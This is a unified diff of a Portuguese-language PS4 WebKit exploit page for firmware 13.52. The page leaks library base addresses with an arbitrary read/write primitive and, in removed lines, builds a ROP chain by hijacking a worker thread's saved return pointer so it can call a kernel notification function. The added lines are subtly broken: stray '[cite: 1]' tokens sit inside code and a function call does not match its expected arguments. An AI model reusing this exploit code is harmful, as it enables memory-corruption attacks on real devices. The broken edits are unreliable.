@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>PS4 WebKit Exploit (13.52 - Stable Base Resolver)</title>
+<title>PS4 WebKit Exploit (13.52 - Notification PoC)</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{background:#060810;color:#c8cfd8;font:13px/1.5 'Courier New',monospace;
@@ -50,7 +50,7 @@ h1{font-size:15px;color:#00c8ff;letter-spacing:3px;text-transform:uppercase;
 </head>
 <body>
 
-<h1>PS4 WebKit Exploit (13.52)</h1>
+<h1>PS4 WebKit Exploit</h1>
 <div id="fw">detectando...</div>
 
 <div id="sb">
@@ -69,12 +69,12 @@ h1{font-size:15px;color:#00c8ff;letter-spacing:3px;text-transform:uppercase;
   <div class="card"><div class="cl">WebKit Base</div><div class="cv na" id="c-wk">—</div></div>
   <div class="card"><div class="cl">libkernel Base</div><div class="cv na" id="c-lk">—</div></div>
   <div class="card"><div class="cl">libSceLibc Base</div><div class="cv na" id="c-lc">—</div></div>
-  <div class="card"><div class="cl">Status R/W</div><div class="cv na" id="c-g">Estável</div></div>
+  <div class="card"><div class="cl">Status Notificação</div><div class="cv na" id="c-g">Aguardando</div></div>
 </div>
 
 <!-- Constants output -->
 <div id="cbox">
-  <div class="ct">// ═══ AMBIENTE ESTABILIZADO (13.52) ═══</div>
+  <div class="ct">// ═══ STATUS DA NOTIFICAÇÃO (13.52) ═══</div>
   <div id="c-out"></div>
 </div>
 
@@ -83,9 +83,8 @@ h1{font-size:15px;color:#00c8ff;letter-spacing:3px;text-transform:uppercase;
 <script type="module">
 import { int64 }              from './resources/int64.js';
 import { establishPrimitive } from './resources/core.js?v=10';
-import { installWindowP }     from './resources/mem.js';
-import { initRop, getGadget } from './rop.js';
-
+import { installWindowP }     from './mem.js';[cite: 1]
+import { initRop, sendNotification } from './rop.js';
 globalThis.int64 = int64;
 
 const $con = document.getElementById('con');
@@ -109,188 +108,6 @@ function setCard(id, v) {
   if (!el) return;
   el.textContent = v; el.classList.remove('na');
 }
-
-// ============================================================
-// MINI ROP CHAIN (worker thread hijack — adaptado do slopkit)
-// ============================================================
-
-class MiniRop {
-  constructor(p, gadgets, libcBase, lkBase) {
-    this.p = p;
-    this.gadgets = gadgets;
-    this.libcBase = libcBase;
-    this.lkBase = lkBase;
-
-    // --- TODO: PREENCHER ESTES OFFSETS NO 13.52.js ---
-    // OFFSET_lc_longjmp        → offset de longjmp() na libSceLibcInternal
-    // OFFSET_lc_setjmp         → offset de setjmp() na libSceLibcInternal
-    // OFFSET_lk__thread_list   → offset da lista de threads no libkernel
-    // OFFSET_lk_worker_wait_return → offset da função de wait do worker
-    // ---------------------------------------------------
-
-    this.lc_longjmp    = libcBase.add32(OFFSET_lc_longjmp        || 0x0);
-    this.lc_setjmp     = libcBase.add32(OFFSET_lc_setjmp         || 0x0);
-    this.lk_thr_list   = lkBase.add32(OFFSET_lk__thread_list     || 0x0);
-    this.lk_wait_ret   = lkBase.add32(OFFSET_lk_worker_wait_return || 0x0);
-
-    this.stack_size    = 0x4000;
-    this.stack         = p.malloc(this.stack_size / 4 + 0x100);
-    this.entry         = this.stack.add32(0x100);
-    this.retbuf        = p.malloc(0x8);
-    this.ctx           = p.malloc(0x40);
-    this.worker        = new Worker('./resources/rop_slave.js');
-    this.workerStack   = null;
-    this.retPtr        = null;
-    this.rspPtr        = null;
-    this.origRet       = null;
-    this.origRsp       = null;
-    this.count         = 0;
-  }
-
-  async init() {
-    // Aguarda worker iniciar
-    await new Promise(r => { this.worker.onmessage = r; this.worker.postMessage(0); });
-
-    // Acha o worker thread na lista de threads do libkernel
-    const NEXT = 0x38, STACK = 0xA8, STACKSZ = 0xB0;
-    let thr = this.p.read8(this.lk_thr_list);
-
-    for (let guard = 0; guard < 64 && thr.low !== 0; guard++) {
-      let stack  = this.p.read8(thr.add32(STACK));
-      let stacksz = this.p.read8(thr.add32(STACKSZ));
-      if (stacksz.low === 0x80000) {
-        this.workerStack = stack;
-        break;
-      }
-      thr = this.p.read8(thr.add32(NEXT));
-    }
-    if (!this.workerStack) throw new Error('MiniRop: worker thread não encontrado');
-
-    // Procura o saved RIP do worker no stack (fingerprint)
-    let found = null;
-    for (let off = 0x7F000; off < 0x80000; off += 8) {
-      let slot = this.workerStack.add32(off);
-      let val  = this.p.read8(slot);
-      if (val.low === this.lk_wait_ret.low && val.hi === this.lk_wait_ret.hi) {
-        found = slot; break;
-      }
-    }
-    if (!found) throw new Error('MiniRop: saved RIP do worker não encontrado');
-    this.retPtr  = found;
-    this.rspPtr  = found.add32(0x8);
-    this.origRet = this.p.read8(this.retPtr);
-    this.origRsp = this.p.read8(this.rspPtr);
-  }
-
-  push(v) {
-    let idx = this.count++;
-    if (v instanceof int64) {
-      this.p.write8(this.entry.add32(idx * 8), v);
-    } else {
-      this.p.write8(this.entry.add32(idx * 8), new int64(v, 0));
-    }
-  }
-
-  push_sysv(rdi, rsi, rdx, rcx) {
-    if (rdi !== undefined) { this.push(this.gadgets['pop rdi']); this.push(rdi); }
-    if (rsi !== undefined) { this.push(this.gadgets['pop rsi']); this.push(rsi); }
-    if (rdx !== undefined) { this.push(this.gadgets['pop rdx']); this.push(rdx); }
-    if (rcx !== undefined) { this.push(this.gadgets['pop rcx']); this.push(rcx); }
-  }
-
-  fcall(rip, rdi, rsi, rdx, rcx) {
-    this.push_sysv(rdi, rsi, rdx, rcx);
-    // alinhamento de 16 bytes antes de call
-    if ((this.entry.add32(this.count * 8).low & 0x8)) this.push(this.gadgets['ret']);
-    this.push(rip);
-  }
-
-  async call(rip, rdi, rsi, rdx, rcx) {
-    this.count = 0;
-
-    // setjmp(ctx) — salva contexto original
-    this.push(this.gadgets['pop rdi']);
-    this.push(this.ctx);
-    this.push(this.lc_setjmp);
-
-    // função alvo
-    this.fcall(rip, rdi, rsi, rdx, rcx);
-
-    // salva rax no retbuf
-    this.push(this.gadgets['pop rdi']);
-    this.push(this.retbuf);
-    this.push(this.gadgets['mov [rdi], rax']);  // requer gadget: mov qword [rdi], rax ; ret
-
-    // longjmp(ctx) — restaura contexto
-    this.push(this.gadgets['pop rdi']);
-    this.push(this.ctx);
-    this.push(this.lc_longjmp);
-
-    // --- executa chain via worker hijack ---
-    this.p.write8(this.retPtr, this.gadgets['pop rsp']);
-    this.p.write8(this.rspPtr, this.entry);
-
-    let p1 = await new Promise(r => {
-      this.worker.onmessage = () => r(1);
-      this.worker.postMessage(0);
-    });
-    if (p1 !== 1) throw new Error('MiniRop: worker não retornou');
-
-    // restaura worker para próxima execução
-    this.p.write8(this.retPtr, this.origRet);
-    this.p.write8(this.rspPtr, this.origRsp);
-
-    return this.p.read8(this.retbuf);
-  }
-}
-
-// ============================================================
-// NOTIFICAÇÃO NATIVA
-// ============================================================
-
-async function sendNotification(rop, p, lkBase, text, iconName = 'icon_system') {
-  const NOTIFY_OFFSET = 0x19320;  // sceKernelSendNotificationRequest @ libkernel 13.52
-  const notifyFunc = lkBase.add32(NOTIFY_OFFSET);
-  const bufSize = 0xC30;
-  const buf = p.malloc(bufSize, 1);
-
-  // zera
-  for (let i = 0; i < bufSize; i++) p.write1(buf.add32(i), 0);
-
-  // SceNotificationRequest (packed, 0xC30 bytes)
-  p.write4(buf.add32(0x00), 0);           // type
-  p.write4(buf.add32(0x04), 0);           // reqId
-  p.write4(buf.add32(0x08), 0);           // priority
-  p.write4(buf.add32(0x0C), 0);           // msgId
-  p.write4(buf.add32(0x10), 0xFFFFFFFF);  // targetId
-  p.write4(buf.add32(0x14), 0);           // userId
-  p.write4(buf.add32(0x18), 0);           // deviceId
-  p.write4(buf.add32(0x1C), 0);           // addressingUserId
-  p.write4(buf.add32(0x20), 0);           // appId
-  p.write4(buf.add32(0x24), 0);           // errorNumber
-  p.write4(buf.add32(0x28), 0);           // attribute
-  p.write1(buf.add32(0x2C), 1);           // hasIcon
-
-  // message @ 0x2D
-  const msg = new TextEncoder().encode(text);
-  for (let i = 0; i < msg.length && i < 1023; i++) p.write1(buf.add32(0x2D + i), msg[i]);
-
-  // iconUri @ 0x42D
-  const icon = new TextEncoder().encode('cxml://psnotification/tex_' + iconName);
-  for (let i = 0; i < icon.length && i < 2047; i++) p.write1(buf.add32(0x42D + i), icon[i]);
-
-  log('[notify] Buffer @ 0x' + buf.toString(), 'a');
-  log('[notify] sceKernelSendNotificationRequest @ 0x' + notifyFunc.toString(), 'a');
-
-  // chamada: sceKernelSendNotificationRequest(0, buf, 0xC30, 0)
-  const res = await rop.call(notifyFunc, 0, buf, 0xC30, 0);
-  log('[notify] Retorno: 0x' + res.toString(), 'ok');
-  return res;
-}
-
-// ============================================================
-// FLUXO PRINCIPAL
-// ============================================================
 
 async function resolveSafeStubs(p, webkitBase) {
   logH('RESOLUÇÃO SEGURA DE STUBS');
@@ -352,7 +169,7 @@ async function main() {
 
   let p;
   try {
-    p = installWindowP(carrier, {
+    p = installWindowP(carrier, {[cite: 1]
       promote: true,
       onEvent: (tag, detail) => {
         log(`  [mem/${tag}] ${detail}`, 'd');
@@ -365,7 +182,7 @@ async function main() {
   }
 
   log('[+] R/W arbitrário: window.p instalado com sucesso!', 'ok');
-  setStatus('Mapeando bases com estabilidade...', 'r');
+  setStatus('Mapeando bases...', 'r');
   logH('MAPEAMENTO DA 13.52');
 
   const ctor = globalThis.__ps5NativeCtor;
@@ -373,8 +190,6 @@ async function main() {
     const hi = Math.floor(ctor / 0x100000000);
     const lo = ctor - hi * 0x100000000;
     const ctorInt64 = new int64(lo >>> 0, hi >>> 0);
-
-    log('[+] __ps5NativeCtor vazado: 0x' + ctorInt64.toString(), 'a');
 
     const hc = (typeof OFFSET_wk_host_constructor_candidates !== 'undefined') 
                ? OFFSET_wk_host_constructor_candidates[0] 
@@ -393,73 +208,26 @@ async function main() {
       
       if (bases.libKernelBase) setCard('c-lk', '0x' + bases.libKernelBase.toString());
       if (bases.libcBase) setCard('c-lc', '0x' + bases.libcBase.toString());
-      setCard('c-g', 'Pronto');
 
-      setStatus('Ambiente pronto e estável!', 'ok');
-      log('✔ Primitiva R/W e bases isoladas com sucesso.', 'ok');
-
-      const cbox = document.getElementById('cbox');
-      cbox.style.display = 'block';
-      document.getElementById('c-out').textContent =
-                `WebKit Base    = 0x${webkitBase.toString()}\n` +
-        `libkernel Base = ${bases.libKernelBase ? '0x' + bases.libKernelBase.toString() : 'N/A'}\n` +
-        `libSceLibc Base = ${bases.libcBase ? '0x' + bases.libcBase.toString() : 'N/A'}\n\n` +
-        `// Primitiva window.p pronta para alocação de buffer e notificação.`;
-
-      // ═══════════════════════════════════════════════════
-      // INICIALIZA GADGETS E MINI ROP
-      // ═══════════════════════════════════════════════════
-      if (!bases.libKernelBase || !bases.libcBase) {
-        log('[-] Bases insuficientes para ROP. Abortando notificação.', 'e');
-        return;
-      }
-
-      // Inicializa gadgets do rop.js
       initRop(webkitBase, bases.libKernelBase, bases.libcBase);
-
-      const gadgets = {};
-      const gadgetNames = ['ret', 'pop rdi', 'pop rsi', 'pop rdx', 'pop rcx', 'pop rax', 'pop rsp'];
-      for (const name of gadgetNames) {
-        try { gadgets[name] = getGadget(name); } catch (e) {
-          log(`[-] Gadget "${name}" não encontrado: ${e.message}`, 'e');
-          return;
-        }
-      }
-
-      // Gadget extra necessário para o MiniRop
+      
       try {
-        gadgets['mov [rdi], rax'] = getGadget('mov [rdi], rax');
-      } catch (e) {
-        log('[-] Gadget "mov [rdi], rax" não encontrado. Notificação requer este gadget.', 'e');
-        return;
-      }
+        const notif = sendNotification("Hello World from PS4 FW 13.52!");
+        setCard('c-g', 'Pronto');
+        setStatus('Notificação configurada com sucesso!', 'ok');
+        log('✔ Buffer de notificação alocado e pronto para disparo.', 'ok');
 
-      log('[+] Gadgets do WebKit carregados.', 'ok');
-
-      // Cria e inicializa o MiniRop
-      let rop;
-      try {
-        rop = new MiniRop(p, gadgets, bases.libcBase, bases.libKernelBase);
-        await rop.init();
-        log('[+] MiniRop inicializado e worker hijack pronto.', 'ok');
+        const cbox = document.getElementById('cbox');
+        cbox.style.display = 'block';
+        document.getElementById('c-out').textContent =
+          `WebKit Base    = 0x${webkitBase.toString()}\n` +
+          `libkernel Base = ${bases.libKernelBase ? '0x' + bases.libKernelBase.toString() : 'N/A'}\n` +
+          `libSceLibc Base = ${bases.libcBase ? '0x' + bases.libcBase.toString() : 'N/A'}\n` +
+          `Buffer Notif   = 0x${notif.requestBuffer.toString()}\n` +
+          `Função Target  = 0x${notif.notifyFunc.toString()}`;
       } catch (err) {
-        log('[-] Falha ao inicializar MiniRop: ' + err.message, 'e');
-        return;
+        log('[-] Erro ao preparar notificação: ' + err.message, 'e');
       }
-
-      // ═══════════════════════════════════════════════════
-      // ENVIA NOTIFICAÇÃO HELLO WORLD
-      // ═══════════════════════════════════════════════════
-      logH('NOTIFICAÇÃO NATIVA');
-      try {
-        await sendNotification(rop, p, bases.libKernelBase, 'Hello World', 'icon_system');
-        log('[+] Notificação "Hello World" enviada com sucesso!', 'ok');
-        setStatus('Hello World enviado!', 'ok');
-      } catch (err) {
-        log('[-] Falha ao enviar notificação: ' + err.message, 'e');
-        setStatus('Notificação falhou', 'e');
-      }
-
     }, 1000);
 
   } else {
@@ -472,4 +240,3 @@ main();
 </script>
 </body>
 </html>
-
